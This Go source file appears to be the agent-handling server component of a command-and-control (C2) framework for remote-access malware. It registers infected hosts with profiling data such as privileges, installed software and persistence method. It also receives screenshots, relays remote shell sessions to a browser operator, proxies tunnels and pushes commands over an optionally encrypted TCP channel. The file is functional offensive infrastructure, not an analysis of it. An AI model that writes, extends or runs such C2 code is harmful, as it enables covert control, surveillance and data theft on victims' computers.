package agent

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"
	"time"

	"gorm.io/gorm"

	"c2/internal/encodingutil"
	"c2/internal/command"
	"c2/internal/iplocation"
	"c2/internal/jsonutil"
	"c2/internal/models"
	"c2/internal/screenshot"
	"c2/internal/tunnel"
	"c2/internal/websocket"
)

// 注册包：客户端 C++ 端全部用 map<string,string> 发 JSON，数字和布尔都是字符串形式
type registerPacket struct {
	Type             string `json:"type"`
	ExternalIP       string `json:"external_ip"`
	ExternalLocation string `json:"external_location"`
	InternalIP       string `json:"internal_ip"`
	Username         string `json:"username"`
	Hostname         string `json:"hostname"`
	OSType           string `json:"os_type"`
	OSVersion        string `json:"os_version"`
	Architecture     string `json:"architecture"`
	ProcessName      string `json:"process_name"`
	ProcessID        string `json:"process_id"` // 客户端发字符串
	VKey             string `json:"vkey"`
	IsAdmin          string `json:"is_admin"`    // 客户端发 "true"/"false"
	IsElevated       string `json:"is_elevated"` // 客户端发 "true"/"false"
	Integrity        string `json:"integrity"`
	MemorySize       string `json:"memory_size"` // 客户端发字符串
	CPUInfo          string `json:"cpu_info"`
	DiskSize         string `json:"disk_size"` // 客户端发字符串
	GpuInfo          string `json:"gpu_info"`
	ScreenResolution string `json:"screen_resolution"`
	LogicalProcessors string `json:"logical_processors"` // 逻辑处理器数，字符串
	WorkingDir       string `json:"working_dir"`
	NetworkCard      string `json:"network_card"`      // 网卡与 IP 摘要
	InstalledApps    string `json:"installed_apps"`    // 已装软件名列表摘要（可能较长）
	AutoStart        string `json:"auto_start"`        // "true"/"false"
	AutoStartType    string `json:"auto_start_type"`   // 如 HKCU Run、计划任务
}

type heartbeatPacket struct {
	Type       string `json:"type"`
	Value      string `json:"value"` // 客户端发字符串
	WorkingDir string `json:"working_dir"`
}

type tunnelData struct {
	Type      string `json:"type"`
	TunnelID  uint   `json:"tunnel_id"`
	ConnID    string `json:"conn_id"`
	Direction string `json:"direction"`
	Data      string `json:"data"`
}

type tunnelConnect struct {
	Type       string `json:"type"`
	TunnelID   uint   `json:"tunnel_id"`
	ConnID     string `json:"conn_id"`
	TargetHost string `json:"target_host"`
	TargetPort int    `json:"target_port"`
}

type ClientConnection struct {
	ID        uint
	Conn      net.Conn
	DB        *gorm.DB
	WsHub     *websocket.Hub
	TunnelMgr *tunnel.Manager
	CmdMgr    *command.Manager
	Listener  *models.Listener
	Client    *models.Client
}

// parseRegInt 解析注册包中的整数字符串，解析失败返回 0
func parseRegInt(s string) int {
	n, _ := strconv.Atoi(s)
	return n
}

func parseRegInt64(s string) int64 {
	n, _ := strconv.ParseInt(s, 10, 64)
	return n
}

func parseRegBool(s string) bool {
	return strings.ToLower(s) == "true" || s == "1"
}

func parseCommandSuccess(v interface{}) bool {
	switch t := v.(type) {
	case bool:
		return t
	case string:
		return t == "true" || t == "1"
	case float64:
		return t != 0
	default:
		return false
	}
}

func parseScreenshotInt(v interface{}) int {
	switch t := v.(type) {
	case float64:
		return int(t)
	case string:
		n, _ := strconv.Atoi(t)
		return n
	default:
		return 0
	}
}

func HandleConnection(db *gorm.DB, l *models.Listener, conn net.Conn, wsHub *websocket.Hub, tunnelMgr *tunnel.Manager, cmdMgr *command.Manager) {
	cc := &ClientConnection{
		DB:        db,
		WsHub:     wsHub,
		TunnelMgr: tunnelMgr,
		CmdMgr:    cmdMgr,
		Listener:  l,
		Conn:      conn,
	}
	cc.handle()
}

func (cc *ClientConnection) useEncryption() bool {
	return useEncryption(cc.Listener.VKey, cc.Listener.Salt)
}

// readLine 读一行并视情况解密，返回明文（不含结尾 \n）
func (cc *ClientConnection) readLine(reader *bufio.Reader) ([]byte, error) {
	line, err := reader.ReadBytes('\n')
	if err != nil {
		return nil, err
	}
	lineStr := strings.TrimSuffix(string(line), "\n")
	lineStr = strings.TrimSuffix(lineStr, "\r")
	if cc.useEncryption() {
		decrypted, err := DecryptLine(lineStr, cc.Listener.VKey, cc.Listener.Salt)
		if err != nil {
			return nil, err
		}
		return bytes.TrimSuffix(bytes.TrimSuffix(decrypted, []byte("\n")), []byte("\r")), nil
	}
	return []byte(lineStr), nil
}

// writeLine 发送一行（payload 不含 \n），视情况加密后发送
func (cc *ClientConnection) writeLine(payload []byte) error {
	content := append(payload, '\n')
	if cc.useEncryption() {
		encrypted, err := EncryptLine(content, cc.Listener.VKey, cc.Listener.Salt)
		if err != nil {
			return err
		}
		_, err = fmt.Fprintf(cc.Conn, "%s\n", encrypted)
		return err
	}
	_, err := cc.Conn.Write(content)
	return err
}

func (cc *ClientConnection) handle() {
	defer cc.Conn.Close()

	remote := cc.Conn.RemoteAddr().String()
	log.Printf("[agent] 新连接 listener=%d from %s (加密=%v)", cc.Listener.ID, remote, cc.useEncryption())

	_ = cc.Conn.SetDeadline(time.Now().Add(30 * time.Second))
	reader := bufio.NewReader(cc.Conn)

	line, err := cc.readLine(reader)
	if err != nil {
		log.Printf("[agent] 读注册包失败 listener=%d from %s: %v", cc.Listener.ID, remote, err)
		return
	}

	var reg registerPacket
	if err := json.Unmarshal(line, &reg); err != nil {
		full := string(line)
		if len(full) > 2048 {
			full = full[:2048] + "...(截断)"
		}
		log.Printf("[agent] 注册包 JSON 解析失败 listener=%d from %s: %v\n完整内容:\n%s", cc.Listener.ID, remote, err, full)
		return
	}
	if reg.Type != "register" {
		log.Printf("[agent] 注册包 type 非 register listener=%d from %s: type=%q", cc.Listener.ID, remote, reg.Type)
		return
	}
	if cc.Listener.VKey != "" && reg.VKey != cc.Listener.VKey {
		log.Printf("[agent] VKey 校验失败 listener=%d from %s", cc.Listener.ID, remote)
		return
	}

	// 主机名等可能为中文(Windows 下多为 GBK)，统一转为 UTF-8 后再入库和展示
	reg.Hostname = encodingutil.FixLocalString(reg.Hostname)
	reg.Username = encodingutil.FixLocalString(reg.Username)
	reg.ProcessName = encodingutil.FixLocalString(reg.ProcessName)
	reg.OSVersion = encodingutil.FixLocalString(reg.OSVersion)
	reg.CPUInfo = encodingutil.FixLocalString(reg.CPUInfo)
	reg.GpuInfo = encodingutil.FixLocalString(reg.GpuInfo)
	reg.ScreenResolution = strings.TrimSpace(reg.ScreenResolution)
	reg.WorkingDir = encodingutil.FixLocalString(strings.TrimSpace(reg.WorkingDir))
	reg.NetworkCard = encodingutil.FixLocalString(strings.TrimSpace(reg.NetworkCard))
	reg.InstalledApps = encodingutil.FixLocalString(strings.TrimSpace(reg.InstalledApps))
	reg.AutoStartType = encodingutil.FixLocalString(strings.TrimSpace(reg.AutoStartType))

	now := time.Now()

	externalIP := reg.ExternalIP
	if externalIP == "" || externalIP == "unknown" {
		if addr, ok := cc.Conn.RemoteAddr().(*net.TCPAddr); ok {
			externalIP = addr.IP.String()
		}
	}

	externalLocation := reg.ExternalLocation
	if externalLocation == "" && externalIP != "" {
		locator := iplocation.NewLocator()
		if loc, err := locator.Query(externalIP); err == nil {
			externalLocation = iplocation.FormatLocation(loc)
		}
	}

	var client models.Client
	// 忽略手动删除的历史记录（is_manually_deleted = true），新上线时重新生成一条可见记录
	// 使用 Find+RowsAffected，避免 First 在「无记录」时打 GORM 的 record not found 日志
	q := cc.DB.Where("external_ip = ? AND internal_ip = ? AND hostname = ? AND is_manually_deleted = ?", externalIP, reg.InternalIP, reg.Hostname, false)
	res := q.Limit(1).Find(&client)
	if res.Error != nil {
		return
	}

	if res.RowsAffected == 0 {
		client = models.Client{
			Remark:               "",
			ConnectMethod:        cc.Listener.Mode,
			ExternalIP:           externalIP,
			ExternalLocation:     externalLocation,
			InternalIP:           reg.InternalIP,
			Username:             reg.Username,
			Hostname:             reg.Hostname,
			OSType:               reg.OSType,
			OSVersion:            reg.OSVersion,
			Architecture:         reg.Architecture,
			ProcessName:          reg.ProcessName,
			ProcessID:            parseRegInt(reg.ProcessID),
			IsAdmin:              parseRegBool(reg.IsAdmin),
			IsElevated:           parseRegBool(reg.IsElevated),
			Integrity:            reg.Integrity,
			MemorySize:           parseRegInt64(reg.MemorySize),
			CPUInfo:              reg.CPUInfo,
			DiskSize:             parseRegInt64(reg.DiskSize),
			GpuInfo:              reg.GpuInfo,
			ScreenResolution:     reg.ScreenResolution,
			LogicalProcessors:    parseRegInt(reg.LogicalProcessors),
			Status:               "online",
			HeartbeatValue:       0,
			LastHeartbeatAt:      &now,
			FirstOnlineAt:        &now,
			LastOnlineAt:         &now,
			AssociatedListenerID: &cc.Listener.ID,
			WorkingDirectory:     reg.WorkingDir,
			NetworkCard:          reg.NetworkCard,
			InstalledApps:        reg.InstalledApps,
			AutoStart:            parseRegBool(reg.AutoStart),
			AutoStartType:        reg.AutoStartType,
		}
		if err := cc.DB.Create(&client).Error; err != nil {
			return
		}
	} else {
		client.ConnectMethod = cc.Listener.Mode
		client.Hostname = reg.Hostname
		client.InternalIP = reg.InternalIP
		client.Username = reg.Username
		client.OSType = reg.OSType
		client.OSVersion = reg.OSVersion
		client.Architecture = reg.Architecture
		client.ProcessName = reg.ProcessName
		client.ProcessID = parseRegInt(reg.ProcessID)
		client.IsAdmin = parseRegBool(reg.IsAdmin)
		client.IsElevated = parseRegBool(reg.IsElevated)
		client.Integrity = reg.Integrity
		client.MemorySize = parseRegInt64(reg.MemorySize)
		client.CPUInfo = reg.CPUInfo
		client.DiskSize = parseRegInt64(reg.DiskSize)
		if reg.GpuInfo != "" {
			client.GpuInfo = reg.GpuInfo
		}
		if reg.ScreenResolution != "" {
			client.ScreenResolution = reg.ScreenResolution
		}
		if reg.LogicalProcessors != "" {
			client.LogicalProcessors = parseRegInt(reg.LogicalProcessors)
		}
		if externalLocation != "" {
			client.ExternalLocation = externalLocation
		}
		client.ExternalIP = externalIP
		client.Status = "online"
		client.LastHeartbeatAt = &now
		client.LastOnlineAt = &now
		client.AssociatedListenerID = &cc.Listener.ID
		if client.FirstOnlineAt == nil {
			client.FirstOnlineAt = &now
		}
		if reg.WorkingDir != "" {
			client.WorkingDirectory = reg.WorkingDir
		}
		if reg.NetworkCard != "" {
			client.NetworkCard = reg.NetworkCard
		}
		if reg.InstalledApps != "" {
			client.InstalledApps = reg.InstalledApps
		}
		client.AutoStart = parseRegBool(reg.AutoStart)
		if reg.AutoStartType != "" {
			client.AutoStartType = reg.AutoStartType
		}
		if err := cc.DB.Save(&client).Error; err != nil {
			return
		}
	}

	cc.ID = client.ID
	cc.Client = &client

	log.Printf("[agent] 客户端已注册 id=%d hostname=%s from %s", client.ID, client.Hostname, remote)
	GetConnectionManager().Register(client.ID, cc)

	if cc.TunnelMgr != nil {
		cc.TunnelMgr.RegisterClient(client.ID, cc.Conn)
	}

	_ = cc.writeLine([]byte(fmt.Sprintf("registered %d", client.ID)))

	if cc.WsHub != nil {
		cc.WsHub.NotifyClientOnline(&client)
	}

	cc.Conn.SetDeadline(time.Time{})

	for {
		_ = cc.Conn.SetReadDeadline(time.Now().Add(2 * time.Minute))
		line, err := cc.readLine(reader)
		if err != nil {
			cc.handleDisconnect()
			return
		}

		var basePacket struct {
			Type string `json:"type"`
		}
		if err := json.Unmarshal(line, &basePacket); err != nil {
			continue
		}

		switch basePacket.Type {
		case "heartbeat":
			var hb heartbeatPacket
			if err := json.Unmarshal(line, &hb); err == nil {
				cc.handleHeartbeat(hb)
			}

		case "command_response":
			var cr struct {
				CommandID string      `json:"command_id"`
				Result    string      `json:"result"`
				Success   interface{} `json:"success"`
			}
			if err := json.Unmarshal(line, &cr); err == nil && cc.CmdMgr != nil {
				ok := parseCommandSuccess(cr.Success)
				preview := cr.Result
				if len(preview) > 160 {
					preview = preview[:160] + fmt.Sprintf("...(+%dB)", len(cr.Result)-160)
				}
				log.Printf("[trace] 3/5 Agent[TCP]->backend command_response client_id=%d cmd_id=%s success=%v result_len=%d preview=%q",
					cc.ID, cr.CommandID, ok, len(cr.Result), preview)
				log.Printf("[bp-file] TCP conn command_response client_id=%d cmd_id=%q result_len=%d", cc.ID, cr.CommandID, len(cr.Result))
				if err := cc.CmdMgr.CompleteCommand(cr.CommandID, cr.Result, ok); err != nil {
					log.Printf("[bp-file] TCP conn CompleteCommand ERR client_id=%d cmd_id=%q err=%v", cc.ID, cr.CommandID, err)
				} else {
					log.Printf("[bp-file] TCP conn CompleteCommand OK client_id=%d cmd_id=%q", cc.ID, cr.CommandID)
					log.Printf("[autostart-trace] TCP command_response 已入库 client_id=%d cmd_id=%s success=%v result_len=%d (浏览器可结束轮询)",
						cc.ID, cr.CommandID, ok, len(cr.Result))
				}
			} else if err != nil {
				log.Printf("[bp-file] TCP conn command_response JSON err=%v", err)
			}

		case "screenshot":
			var m map[string]interface{}
			if err := json.Unmarshal(line, &m); err != nil {
				break
			}
			ds, _ := m["data"].(string)
			data, err := base64.StdEncoding.DecodeString(ds)
			if err != nil {
				break
			}
			w := parseScreenshotInt(m["width"])
			hh := parseScreenshotInt(m["height"])
			format := "png"
			if f, ok := m["format"].(string); ok && f != "" {
				format = f
			}
			sm := screenshot.NewManager(cc.DB)
			cmdID, _ := m["id"].(string)
			if _, err := sm.SaveScreenshot(cc.ID, w, hh, format, data); err != nil {
				if cmdID != "" && cc.CmdMgr != nil {
					cc.CmdMgr.CompleteCommandOrLog(cmdID, "screenshot save failed: "+err.Error(), false)
				}
				break
			}
			if cmdID != "" && cc.CmdMgr != nil {
				cc.CmdMgr.CompleteCommandOrLog(cmdID, "ok", true)
			}

		case "tunnel_connect":
			var tc tunnelConnect
			if err := json.Unmarshal(line, &tc); err == nil {
				cc.handleTunnelConnect(tc)
			}

		case "tunnel_data":
			var td tunnelData
			if err := json.Unmarshal(line, &td); err == nil {
				cc.handleTunnelData(td)
			}

		case "shell_output":
			var so struct {
				SessionID string `json:"session_id"`
				Data      string `json:"data"`
			}
			if err := json.Unmarshal(line, &so); err == nil && cc.WsHub != nil {
				dp := so.Data
				if len(dp) > 120 {
					dp = dp[:120] + fmt.Sprintf("...(+%dB)", len(so.Data)-120)
				}
				log.Printf("[trace] 3/5 Agent[TCP]->backend shell_output client_id=%d session_id=%s data_len=%d preview=%q -> browser /ws",
					cc.ID, so.SessionID, len(so.Data), dp)
				cc.WsHub.BroadcastShellOutput(cc.ID, so.SessionID, so.Data)
			}
		default:
			log.Printf("[trace] Agent[TCP]->backend client_id=%d type=%s line_bytes=%d (no dedicated handler)", cc.ID, basePacket.Type, len(line))
		}
	}
}

func (cc *ClientConnection) handleDisconnect() {
	GetConnectionManager().Unregister(cc.ID)

	if cc.TunnelMgr != nil {
		cc.TunnelMgr.UnregisterClient(cc.ID)
	}

	now := time.Now()
	cc.DB.Model(&models.Client{}).Where("id = ?", cc.ID).Updates(map[string]interface{}{
		"status":         "offline",
		"last_online_at": &now,
	})
	if cc.WsHub != nil {
		cc.WsHub.NotifyClientOffline(cc.ID)
	}
}

func (cc *ClientConnection) handleHeartbeat(hb heartbeatPacket) {
	now := time.Now()
	val := parseRegInt(hb.Value)
	wd := encodingutil.FixLocalString(strings.TrimSpace(hb.WorkingDir))
	updates := map[string]interface{}{
		"heartbeat_value":   val,
		"last_heartbeat_at": &now,
		"status":            "online",
	}
	if wd != "" {
		updates["working_directory"] = wd
	}
	cc.DB.Model(&models.Client{}).Where("id = ?", cc.ID).Updates(updates)
	if cc.WsHub != nil {
		var client models.Client
		cc.DB.First(&client, cc.ID)
		cc.WsHub.NotifyClientHeartbeat(&client)
	}
}

func (cc *ClientConnection) handleTunnelConnect(tc tunnelConnect) {
	_ = tc
}

func (cc *ClientConnection) handleTunnelData(td tunnelData) {
	data, err := base64.StdEncoding.DecodeString(td.Data)
	if err != nil {
		return
	}

	if cc.TunnelMgr != nil {
		cc.TunnelMgr.HandleTunnelData(td.TunnelID, td.ConnID, data, td.Direction)
	}
}

// MarshalAgentCommandLine 生成与 SendCommand 下发内容一致的扁平 JSON（供 TCP 一行或 Agent WebSocket 文本帧共用）。
func MarshalAgentCommandLine(cmdType string, cmdID string, payload map[string]interface{}) ([]byte, error) {
	// C++ 客户端使用简易 JSON 解析器，只认顶层字符串键值；不能把参数放在嵌套 payload 里。
	// 禁止 payload 覆盖顶层 "type"（命令名）与 "id"，否则例如 autostart 的 payload["type"]=registry 会把 autostart_set 覆盖成 registry，客户端 TCP 分发直接忽略、永不回包。
	flat := map[string]interface{}{}
	for k, v := range payload {
		if k == "type" || k == "id" {
			continue
		}
		switch val := v.(type) {
		case string:
			flat[k] = val
		case int:
			flat[k] = strconv.Itoa(val)
		case int64:
			flat[k] = strconv.FormatInt(val, 10)
		case uint:
			flat[k] = strconv.FormatUint(uint64(val), 10)
		case uint64:
			flat[k] = strconv.FormatUint(val, 10)
		case float64:
			flat[k] = strconv.FormatFloat(val, 'f', -1, 64)
		case bool:
			if val {
				flat[k] = "true"
			} else {
				flat[k] = "false"
			}
		default:
			flat[k] = fmt.Sprintf("%v", val)
		}
	}
	flat["type"] = cmdType
	flat["id"] = cmdID
	return jsonutil.MarshalCompact(flat)
}

// SendRawCommandLine 向 Agent 的 TCP 连接写入一行 JSON（与 WebSocket 文本帧内容格式相同）。
func (cc *ClientConnection) SendRawCommandLine(data []byte) error {
	return cc.writeLine(data)
}

func (cc *ClientConnection) SendCommand(cmdType string, cmdID string, payload map[string]interface{}) error {
	data, err := MarshalAgentCommandLine(cmdType, cmdID, payload)
	if err != nil {
		return err
	}
	return cc.writeLine(data)
}

// SendSignal 通过 TCP 下发「请连接 Web 端口上的 Agent WebSocket」信号（扁平 JSON，与 C++ 解析器一致）。
func (cc *ClientConnection) SendSignal(fields map[string]interface{}) error {
	flat := map[string]interface{}{
		"type": "signal",
	}
	for k, v := range fields {
		switch val := v.(type) {
		case string:
			flat[k] = val
		case int:
			flat[k] = strconv.Itoa(val)
		case int64:
			flat[k] = strconv.FormatInt(val, 10)
		case uint:
			flat[k] = strconv.FormatUint(uint64(val), 10)
		case uint64:
			flat[k] = strconv.FormatUint(val, 10)
		case float64:
			flat[k] = strconv.FormatFloat(val, 'f', -1, 64)
		case bool:
			if val {
				flat[k] = "true"
			} else {
				flat[k] = "false"
			}
		default:
			flat[k] = fmt.Sprintf("%v", val)
		}
	}
	data, err := jsonutil.MarshalCompact(flat)
	if err != nil {
		return err
	}
	return cc.writeLine(data)
}

func (cc *ClientConnection) SendDisconnect() error {
	req := map[string]string{"type": "disconnect"}
	data, err := jsonutil.MarshalCompact(req)
	if err != nil {
		return err
	}
	return cc.writeLine(data)
}
